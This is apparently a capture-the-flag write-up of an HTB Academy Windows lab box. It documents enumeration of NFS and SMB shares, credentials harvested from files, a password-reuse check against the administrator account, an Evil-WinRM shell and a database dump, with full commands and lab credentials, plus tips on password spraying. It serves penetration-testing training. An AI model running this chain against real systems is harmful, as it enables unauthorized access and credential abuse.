# WINMEDIUM - Easy

**Date Completed:** March 6, 2026  
**Difficulty:** Easy  
**Status:** ✅ PWNED

---

## Box Information

| Property | Value |
|----------|-------|
| OS | Windows Server 2019 (Build 17763) |
| IP | 10.129.1.254 |
| Hostname | WINMEDIUM |
| Module | HTB Academy - Footprinting |

**Key Services:** SMB, NFS, RDP, WinRM, MSSQL (localhost only)

---

## Machine Overview

WINMEDIUM is a Windows Server 2019 machine that demonstrates the importance of thorough enumeration across multiple services (NFS, SMB, MSSQL) and the dangers of credential reuse. The attack chain involves discovering initial credentials via an NFS share, pivoting through SMB to find MSSQL SA credentials, exploiting password reuse to gain Administrator access via WinRM, then connecting to MSSQL locally via RDP to extract the final flag from a database.

---

## Key Concepts Learned

- NFS share enumeration and mounting
- SMB share enumeration and file retrieval
- Identifying non-zero byte files among decoy files
- MSSQL credential discovery and database enumeration
- Password reuse exploitation across services
- NetExec for multi-protocol credential validation
- Evil-WinRM for remote shell access
- RDP + SSMS for local MSSQL access
- Understanding service access restrictions (WinRM groups, RDP groups)

---

## Reconnaissance

### Phase 1: Service Enumeration

**Command:**
```bash
nmap -sV -sC 10.129.1.254 -oA nmap_medium_scan
```

**Explanation:**
- `-sV`: Service version detection
- `-sC`: Default NSE scripts
- `-oA`: Output in all formats

**Results:**
```
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Key Findings Summary

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 111 | rpcbind | 2-4 | RPC portmapper — indicates NFS |
| 135 | MSRPC | Windows RPC | Standard Windows RPC |
| 139 | NetBIOS-SSN | Windows | SMB over NetBIOS |
| 445 | SMB | microsoft-ds | Direct SMB |
| 2049 | NFS/nlockmgr | 1-4 | NFS file sharing |
| 3389 | RDP | MS Terminal Services | Remote Desktop |
| 5985 | WinRM | HTTP API 2.0 | Windows Remote Management |

**Host Script Results:**
- SMB signing: enabled but **not required**
- RDP NTLM Info: Target `WINMEDIUM`, Product Version `10.0.17763`
- Clock skew: -48s from scanner time

**Critical Observations:**
- NFS (2049) is unusual on a Windows box — likely contains shared data
- MSSQL (1433) is **not exposed externally** but SSMS shortcut found later on Desktop
- WinRM (5985) is open — potential shell access if we find authorized credentials
- Multiple attack vectors: NFS, SMB, RDP, WinRM

---

## Exploitation Chain

### Phase 2: NFS Enumeration — Initial Credential Discovery

**Step 1: Enumerate NFS exports**
```bash
showmount -e 10.129.1.254
```

**Results:**
```
Export list for 10.129.1.254:
/TechSupport (everyone)
```

> 🔑 **Key Finding:** The `/TechSupport` share is exported to **everyone** — no authentication required.

**Step 2: Mount the NFS share**
```bash
mkdir -p /tmp/techsupport
sudo mount -t nfs 10.129.1.254:/TechSupport /tmp/techsupport
```

**Step 3: Examine contents**
```bash
sudo ls -la /tmp/techsupport
```

**Result:** Found credentials for user `alex` with password `lol123!mD`.

---

### Phase 3: SMB Enumeration — Credential Pivoting

**Step 1: List SMB shares with discovered credentials**
```bash
smbclient -L //10.129.1.254 -U alex
# Password: lol123!mD
```

**Shares Found:**
| Share | Type | Comment |
|-------|------|---------|
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| devshare | Disk | (none) |
| IPC$ | IPC | Remote IPC |
| Users | Disk | (none) |

**Step 2: Enumerate `devshare`**
```bash
smbclient //10.129.1.254/devshare -U alex
# Password: lol123!mD
smb: \> ls
smb: \> get important.txt
```

**Step 3: Read the file**
```bash
cat important.txt
```

**Result:**
```
sa:87N1ns@slls83
```

> 🔑 **Critical Finding:** MSSQL `sa` (System Administrator) credentials discovered: `sa:87N1ns@slls83`

**Step 4: Enumerate the Users share — find the TechSupport ticket**

```bash
smbclient //10.129.1.254/Users -U alex -c 'cd alex\TechSupport; ls'
```

**Result:** Found ~160 ticket files, all 0 bytes **except one**:
- `ticket4238791283782.txt` — **1305 bytes**

**Step 5: Download and read the non-empty ticket**
```bash
smbclient //10.129.1.254/Users -U alex -c 'cd alex\TechSupport; get ticket4238791283782.txt'
cat ticket4238791283782.txt
```

**Contents — Tech support chat with web config:**
```
smtp {
    host=smtp.web.dev.inlanefreight.htb
    #port=25
    ssl=true
    user="alex"
    password="lol123!mD"
    from="alex.g@web.dev.inlanefreight.htb"
}

securesocial {
    onLoginGoTo=/
    onLogoutGoTo=/login
    ssl=false
    ...
    cookie {
        #domain="10.129.2.59:9500"
        httpOnly=true
        ...
    }
}
```

**Key Takeaway:** Confirmed alex's credentials and revealed SMTP configuration. The commented-out domain `10.129.2.59:9500` indicates a web application but wasn't needed for this attack path.

**Step 6: Additional SMB Enumeration — Alex's profile**

Notable findings in `\alex\` directory:
- `Desktop\Microsoft SQL Server Management Studio 18.lnk` — Confirms MSSQL is installed on the box
- `Documents\SQL Server Management Studio\` — SSMS configuration files
- `Documents\Visual Studio 2017\` — Development tools present

---

### Phase 4: Service Access Testing — Finding the Right Path

**Attempts that failed:**

| Method | User | Password | Result | Reason |
|--------|------|----------|--------|--------|
| Evil-WinRM | sa | 87N1ns@slls83 | ❌ Auth Error | `sa` is SQL-only, not a Windows account |
| Evil-WinRM | alex | lol123!mD | ❌ Auth Error | alex not in Remote Management Users |
| impacket-mssqlclient | sa | 87N1ns@slls83 | ❌ Connection Refused | MSSQL port 1433 not exposed externally |
| xfreerdp | alex | lol123!mD | ❌ LOGON_FAILED_OTHER | alex not in Remote Desktop Users |
| rpcclient | alex | lol123!mD | ❌ Disconnected | RPC connection dropped |

**Step 1: Test password reuse with NetExec**
```bash
netexec smb 10.129.1.254 -u administrator -p '87N1ns@slls83'
```

**Result:**
```
SMB  10.129.1.254  445  WINMEDIUM  [+] WINMEDIUM\administrator:87N1ns@slls83 (Pwn3d!)
```

> 🔑 **Password Reuse!** The MSSQL `sa` password `87N1ns@slls83` is also the **local Administrator** password!

---

### Phase 5: Administrator Access

**Step 1: Connect via Evil-WinRM as Administrator**
```bash
evil-winrm -i 10.129.1.254 -u administrator -p '87N1ns@slls83'
```

**Result:**
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
winmedium\administrator
```

✅ **Administrator shell obtained!**

---

### Phase 6: MSSQL Database Enumeration via RDP

Since MSSQL is only accessible from localhost, we use RDP with Administrator credentials to access SSMS.

**Step 1: Connect via RDP**
```bash
xfreerdp /u:administrator /p:'87N1ns@slls83' /v:10.129.1.254 /cert:ignore
```

**Step 2: Open SQL Server Management Studio (SSMS 18)**

Connected with:
- **Server:** `WINMEDIUM` (localhost)
- **Authentication:** Windows Authentication (as Administrator)

**Step 3: Enumerate databases**
```sql
SELECT name FROM sys.databases
```

| # | Database |
|---|----------|
| 1 | master |
| 2 | tempdb |
| 3 | model |
| 4 | msdb |
| 5 | **accounts** |

**Step 4: Enumerate tables in `accounts` database**
```sql
USE accounts
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```

| # | Table |
|---|-------|
| 1 | **devsacc** |

**Step 5: Dump the `devsacc` table**
```sql
USE accounts
SELECT * FROM devsacc WHERE name = 'HTB'
```

| id | name | password |
|----|------|----------|
| 157 | HTB | lnch7ehrdn43i7AoqVPK4zWR |

✅ **Flag Captured: `lnch7ehrdn43i7AoqVPK4zWR`**

---

## Attack Summary

```
NFS Share (/TechSupport)
    └─> alex:lol123!mD (initial credentials)
            │
            ├─> SMB (devshare) ──> important.txt ──> sa:87N1ns@slls83
            │
            ├─> SMB (Users) ──> TechSupport ticket ──> SMTP config (confirms creds)
            │
            └─> Password Reuse Testing
                    │
                    └─> NetExec SMB ──> administrator:87N1ns@slls83 (Pwn3d!)
                            │
                            ├─> Evil-WinRM ──> Administrator shell
                            │
                            └─> RDP ──> SSMS ──> accounts.devsacc ──> FLAG
```

1. Nmap scan identified SMB (445), NFS (2049), RDP (3389), and WinRM (5985)
2. Enumerated NFS exports — found `/TechSupport` shared to everyone
3. Mounted NFS share — discovered `alex:lol123!mD` credentials
4. Enumerated SMB shares with alex's credentials
5. Downloaded `important.txt` from `devshare` — found `sa:87N1ns@slls83`
6. Found tech support ticket in Users share with SMTP configuration
7. MSSQL port 1433 not exposed externally — couldn't connect directly
8. Tested password reuse — Administrator uses same password as MSSQL `sa`
9. Gained Administrator shell via Evil-WinRM
10. Connected via RDP, opened SSMS, queried `accounts.devsacc` table
11. **Flag extracted from database**

---

## Key Techniques Used

- **Nmap:** Port scanning with service/version detection (-sV -sC)
- **showmount:** NFS export enumeration
- **mount -t nfs:** Mounting NFS shares
- **SMBClient:** Share enumeration and file download
- **NetExec:** Multi-protocol credential validation (SMB, WinRM, RDP)
- **Evil-WinRM:** Windows Remote Management shell
- **xfreerdp:** Remote Desktop Protocol access
- **SSMS:** SQL Server Management Studio for local MSSQL access
- **T-SQL:** Database enumeration queries

---

## Tools Used

- Nmap (port scanning)
- showmount (NFS enumeration)
- SMBClient (share enumeration)
- NetExec (credential spraying)
- Evil-WinRM (remote shell)
- xfreerdp (RDP access)
- SQL Server Management Studio 18 (database access)

---

## Lessons Learned

1. **NFS on Windows is Unusual** — Always check NFS exports, especially when rpcbind (111) and nlockmgr (2049) appear on a Windows target
2. **Not All Files Are Equal** — Among 160+ decoy ticket files (0 bytes), only one had actual content (1305 bytes). Always check file sizes
3. **MSSQL May Not Be Externally Exposed** — Port 1433 wasn't open, but SSMS on the Desktop confirmed MSSQL was installed. Access it locally after gaining a foothold
4. **Password Reuse is King** — The MSSQL `sa` password was reused for the Windows Administrator account. Always test discovered passwords against other services and accounts
5. **Service Access ≠ Authentication** — `alex` could authenticate to WinRM but wasn't authorized to execute commands (not in Remote Management Users group). Understanding Windows group membership matters
6. **NetExec is Essential** — Quickly validates credentials across multiple protocols (SMB, WinRM, RDP, MSSQL) without manually testing each one
7. **Multiple Enumeration Paths** — NFS and SMB both led to the TechSupport directory but with potentially different access levels and content

---

## Pro Tips

- Use `showmount -e <IP>` early in enumeration when you see ports 111/2049
- When listing SMB directories with many files, look for non-zero file sizes — those are the real targets
- Use `netexec` to quickly spray discovered passwords across all open services
- When MSSQL isn't externally accessible, gain a foothold first and connect locally
- The `-c` flag in `smbclient` lets you run commands non-interactively: `smbclient //IP/share -U user -c 'ls; get file.txt'`
- Always try `administrator` with every password you discover

---

## References

- [NetExec Documentation](https://www.netexec.wiki/)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [SMBClient Man Page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [NFS Pentesting - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [MSSQL Pentesting - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

---

## Box Statistics

- **Difficulty:** Easy
- **Attack Complexity:** Moderate (multi-service enumeration required)
- **Skills Required:** NFS, SMB, WinRM, RDP, MSSQL, credential testing
- **Key Skill:** Password reuse detection and cross-service credential validation
- **Biggest Challenge:** Realizing MSSQL wasn't externally exposed and needed local access

---

## Notes

This box is an excellent exercise in cross-service enumeration and credential pivoting. The key insight is that credentials found in one service (NFS → SMB → MSSQL SA password) can unlock completely different services (Windows Administrator via password reuse). The box also teaches patience — many rabbit holes (RPC, direct MSSQL connection, RDP as alex) before finding the correct path through NetExec credential validation.

**Status:** BOX PWNED ✅
